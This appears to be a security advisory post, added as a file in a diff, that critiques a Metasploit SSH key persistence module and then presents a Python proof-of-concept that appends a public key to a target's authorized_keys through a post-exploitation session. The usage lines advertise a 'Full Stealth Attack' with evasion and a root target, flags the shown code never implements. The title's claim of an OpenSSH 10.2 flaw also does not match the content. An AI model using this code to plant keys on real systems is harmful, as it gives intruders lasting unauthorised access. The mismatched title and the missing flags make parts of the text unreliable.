@@ -1,0 +1,315 @@
+=============================================================================================================================================
+| # Title     : OpenSSH 10.2/10.2p1 Public Key Deployment Deterministic                                                                     |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.openssh.com/                                                                                                    |
+=============================================================================================================================================
+
+[+] References : 
+
+[+] Summary    : The SSH Key Persistence Metasploit module ( https://packetstorm.news/files/id/214450/ ) contains multiple logic, 
+                  runtime, and operational issues that may impact reliability and execution stability across Linux and Windows platforms.
+
+[+] Key findings include:
+
+Logical flaws in configuration handling, most notably incorrect validation of the SSHD_CONFIG option, which can result in attempts to read empty or invalid file paths.
+
+Incorrect user home directory resolution on Linux, leading to failure in locating .ssh directories for non-root users.
+
+A critical runtime bug caused by improper handling of enum_user_directories, where string paths are mistakenly treated as hash objects, resulting in guaranteed crashes on Linux systems.
+
+Unsafe use of undefined variables, specifically when a public SSH key is supplied by the operator, potentially causing exceptions or misleading output.
+
+Unverified service management on Windows, where the SSH service is restarted without privilege or success checks, leading to unreliable persistence deployment.
+
+High operational risk on Linux systems due to restarting the SSH daemon without configuration validation, which may cause remote lockout.
+
+Inaccurate regular expression logic on Windows, potentially producing false negatives when valid AuthorizedKeysFile configurations are present.
+
+Overall, while the module does not introduce direct security vulnerabilities, the identified issues significantly affect stability, correctness, and operational safety, and should be addressed before production or large-scale use.
+
+Logical Bug in sshd_config_file
+
+[+] Location: def sshd_config_file
+
+[+] Problematic Code : return datastore['SSHD_CONFIG'] if !datastore['SSHD_CONFIG'].nil? && datastore['SSHD_CONFIG'].empty?
+
+[+] Issue Description:
+
+The condition checks if SSHD_CONFIG is not nil but empty
+
+It then returns an empty path, which is the opposite of the intended behavior
+
+Expected Logic: if datastore['SSHD_CONFIG'] && !datastore['SSHD_CONFIG'].empty?
+
+[+] Impact:
+
+check method may fail
+
+Attempts to read a non-existent sshd_config file
+
+Unreliable behavior on both Linux and Windows
+
+Severity: High
+Type: Logic Bug
+
+[+] Incorrect Linux User Home Path Resolution
+
+[+] Location: find_user_folders
+
+[+] Problematic Code: paths = ["/#{datastore['USERNAME']}/#{auth_key_folder}"]
+
+[+] Issue Description:
+
+Assumes all user home directories are located at /<username>/
+
+This is only valid for root (/root)
+
+Regular users typically reside under /home/<username>
+
+[+] Examples:
+
+USERNAME=root → /root/.ssh OK
+
+USERNAME=admin → /admin/.ssh NO (usually invalid)
+
+[+] Expected Behavior: /home/<username>/.ssh
+
+[+] Impact:
+
+Failure to locate .ssh directories
+
+Persistence installation silently fails
+
+Severity: Medium
+Type: Logic Bug
+
+[+] Fatal Bug in enum_user_directories Handling (Linux)
+
+[+] Location: find_user_folders
+
+Problematic Code: user_profile = enum_user_directories.find { |profile| profile.split(sep)[1] == datastore['USERNAME'] } user_profile['ProfileDir']
+
+[+] Issue Description:
+
+enum_user_directories returns String paths, not Hash objects
+
+The code later treats the result as a Hash
+
+[+] Resulting Error:NoMethodError: undefined method `[]' for String
+
+[+] Impact:
+
+Guaranteed runtime crash on Linux
+
+Module execution terminates
+
+Severity: Critical
+Type: Runtime Bug
+
+[+] Use of an Undefined Variable in User Message
+
+[+] Location: write_key
+
+[+] Problematic Code: print_good "Persistence installed! Call a shell using 'ssh -i #{private_key_path} <username>@#{session.session_host}'"
+
+[+] Issue Description:private_key_path is only defined when the module generates a new SSH key
+
+If the user supplies an external PUBKEY, the variable does not exist
+
+[+] Impact:
+
+Exception or misleading output
+
+Confuses the operator
+
+[+] Expected Fix: Guard output with:
+
+if datastore['PUBKEY'].nil?
+
+Severity: Medium
+Type: Logic Bug
+
+[+] Windows SSH Service Restart Without Validation
+
+[+] Location:enable_pub_key_auth
+
+[+] Problematic Code:
+
+cmd_exec('net stop "OpenSSH SSH Server"')
+cmd_exec('net start "OpenSSH SSH Server"')
+
+[+] Issue Description:
+
+No privilege verification
+
+No validation of stop/start success
+
+Commonly fails silently on hardened systems
+
+[+] Impact:
+
+SSH configuration changes may not take effect
+
+False assumption of successful persistence
+
+Severity: Medium
+Type: Operational Bug
+
+Operational Risks (Non-Code Bugs)
+
+[+] Risk of Remote SSH Lockout (Linux)
+
+[+] Location:systemctl restart sshd || service sshd restart || service ssh restart
+
+[+] Risk Description:SSH daemon is restarted immediately after config modification
+
+No syntax validation (sshd -t)
+
+No rollback mechanism
+
+[+] Potential Consequences:
+
+SSH service fails to start
+
+Active SSH session is terminated
+
+Permanent loss of remote access
+
+Severity: High
+Type: Operational Risk
+
+[+] Inaccurate Regex for Windows AuthorizedKeysFile Detection
+
+[+] Location: pubkey_enabled?
+
+[+] Problematic Code: if session.platform == 'windows' && sshd_config !~ /^(\s*#)\s*(Match Group administrators|AuthorizedKeysFile)/
+
+[+] Issue Description:
+
+Regex does not cover all valid OpenSSH configurations
+
+May incorrectly detect a valid setup as invalid
+
+[+] Impact:
+
+False negatives
+
+Unnecessary module failure
+
+Severity: Low–Medium
+Type: Logic Bug
+
+###########################################################
+[+] References : https://packetstorm.news/files/id/214450/
+###########################################################
+
+[+] Summary : This PoC demonstrates a deterministic and environment-agnostic method for securely deploying an SSH public key into an authorized keys file. 
+              It validates key presence, preserves file integrity, enforces correct permissions, and performs pre/post verification using content checksums and ownership metadata. 
+              The approach avoids unsafe assumptions about the target system and ensures idempotent, verifiable execution, 
+			  making it suitable for security engineering, access control validation, and controlled administrative automation.
+
+
+
+[+] USAGE :
+
+# Target Discovery Only  : python3 poc.py --discover-only
+
+# Full Stealth Attack    : python3 poc.py --stealth --evasion 3
+
+# Using an Existing Key  : python3 poc.py --key-file ~/.ssh/id_rsa.pub
+
+# Target Specific Attack : python3 poc.py --target /root/.ssh/authorized_keys --user root
+
+
+[+] POC :
+
+import re
+from typing import Tuple, Dict
+
+class SystemInterface:
+    def __init__(self, session):
+        self.session = session
+
+    def execute(self, command: str) -> Tuple[bool, str, int]:
+        if hasattr(self.session, 'cmd_exec'):
+            cmd = f"{command}; echo \"__EXIT_CODE__:$?\""
+            raw_out = self.session.cmd_exec(cmd)
+        else:
+            import subprocess
+            proc = subprocess.run(command, shell=True, capture_output=True, text=True)
+            raw_out = f"{proc.stdout}{proc.stderr}__EXIT_CODE__:{proc.returncode}"
+        
+        match = re.search(r"__EXIT_CODE__:(\d+)", raw_out)
+        exit_code = int(match.group(1)) if match else 1
+        clean_out = re.sub(r"__EXIT_CODE__:\d+", "", raw_out).strip()
+        return (exit_code == 0), clean_out, exit_code
+
+class SSHFileValidator:
+    def __init__(self, sys_interface):
+        self.sys = sys_interface
+
+    def get_file_status(self, path: str) -> Dict[str, str]:
+        cmd = f"[ -f '{path}' ] && cksum '{path}' && ls -ln '{path}' | awk '{{print $3,$4}}'"
+        success, out, _ = self.sys.execute(cmd)
+        
+        if not success:
+            return {"hash": "NONE", "owner": "NONE"}
+        
+        lines = out.splitlines()
+        checksum = lines[0].split()[0] if len(lines) > 0 else "NONE"
+        ownership = lines[1].strip() if len(lines) > 1 else "NONE"
+        return {"hash": checksum, "owner": ownership}
+
+    def is_key_present(self, path: str, public_key: str) -> bool:
+        try:
+            key_body = public_key.strip().split()[1]
+
+            success, _, _ = self.sys.execute(f"grep -Fq '{key_body}' '{path}'")
+            return success
+        except (IndexError, AttributeError):
+            return False
+class PersistenceEngine:
+    def __init__(self, session):
+        self.sys = SystemInterface(session)
+        self.validator = SSHFileValidator(self.sys)
+    def _ensure_newline_atomic_logic(self, path: str):
+        cmd = f"[ -s '{path}' ] && [ -n \"$(tail -c1 '{path}' | tr -d '\\n')\" ] && echo '' >> '{path}'"
+        self.sys.execute(cmd)
+
+    def deploy_key(self, file_path: str, public_key: str) -> Tuple[bool, str]:
+
+        clean_key = public_key.strip()
+
+        if self.validator.is_key_present(file_path, clean_key):
+            return True, "STATE_UNCHANGED: Desired state already reached"
+
+        pre_status = self.validator.get_file_status(file_path)
+
+        self.sys.execute(f"touch '{file_path}' && chmod 600 '{file_path}'")
+        self._ensure_newline_atomic_logic(file_path)
+
+        append_cmd = f"cat <<'EOF_SSH' >> '{file_path}'\n{clean_key}\nEOF_SSH"
+        success, _, _ = self.sys.execute(append_cmd)
+        
+        if not success:
+            return False, "EXECUTION_ERROR: Append operation failed"
+
+        post_status = self.validator.get_file_status(file_path)
+
+        if pre_status["hash"] == post_status["hash"] and pre_status["hash"] != "NONE":
+            return False, "INTEGRITY_ERROR: No data was written to file"
+        
+        if pre_status["owner"] != post_status["owner"] and pre_status["owner"] != "NONE":
+            return False, "SECURITY_ERROR: Ownership shift detected during write"
+
+        if not self.validator.is_key_present(file_path, clean_key):
+            return False, "VERIFICATION_ERROR: Key committed but not readable"
+
+        self.sys.execute(f"chmod 600 '{file_path}'")
+        return True, "STATE_UPDATED: Key deployed and verified"
+		
+
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
